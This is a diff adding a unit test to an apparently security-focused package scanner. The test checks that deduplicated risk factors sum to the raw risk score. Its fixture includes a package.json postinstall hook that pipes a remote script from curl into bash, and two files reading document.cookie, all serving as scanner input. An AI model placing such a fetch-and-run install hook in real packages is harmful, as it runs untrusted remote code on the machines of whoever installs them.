@@ -463,6 +463,22 @@ describe("scan transparency (scanned/skipped tracking)", () => {
     expect(result.rawRiskScore).toBe(0)
     expect(result.riskScore).toBe(0)
   })
+
+  it("factors are deduped signal contributions that sum to rawRiskScore", async () => {
+    const result = await scan({
+      "package.json": JSON.stringify({
+        name: "sample",
+        scripts: { postinstall: "curl https://example.com/x.sh | bash" }
+      }),
+      "src/a.js": `const c = document.cookie\n`,
+      "src/b.js": `const c = document.cookie\n`
+    })
+    expect(result.findings.length).toBeGreaterThan(result.factors.length)
+    const factorTotal = result.factors.reduce((sum, f) => sum + f.weight, 0)
+    expect(factorTotal).toBeCloseTo(result.rawRiskScore, 10)
+    const merged = result.factors.find((f) => f.description.includes("counted once"))
+    expect(merged).toBeDefined()
+  })
 })
 
 describe("hardcoded-IP detection (false-positive guardrails)", () => {
